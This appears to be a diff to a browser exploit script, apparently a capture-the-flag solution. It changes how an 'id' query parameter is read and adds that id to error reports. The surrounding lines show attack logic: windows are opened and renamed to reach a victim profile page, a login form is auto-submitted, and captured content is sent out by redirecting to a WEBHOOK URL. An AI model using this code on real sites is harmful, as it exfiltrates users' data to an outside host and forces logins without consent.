@@ -15,8 +15,11 @@ function post(url, data) {
   return xhr.send(data);
 }
 
+const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+const id = urlParams.get("id");
+
 try {
-  const id = url.searchParams.get("id");
   if (id === "1") {
     window.open(PROFILE, "first");
     const me = window.open(ORIGIN + "?id=2", "first");
@@ -29,5 +32,5 @@ window.location="${WEBHOOK}?" + content;
     document.getElementById("login").submit();
   }
 } catch (error) {
-  post(WEBHOOK, `Error: ${error}`);
+  post(WEBHOOK, `Error ${id}: ${error}`);
 }
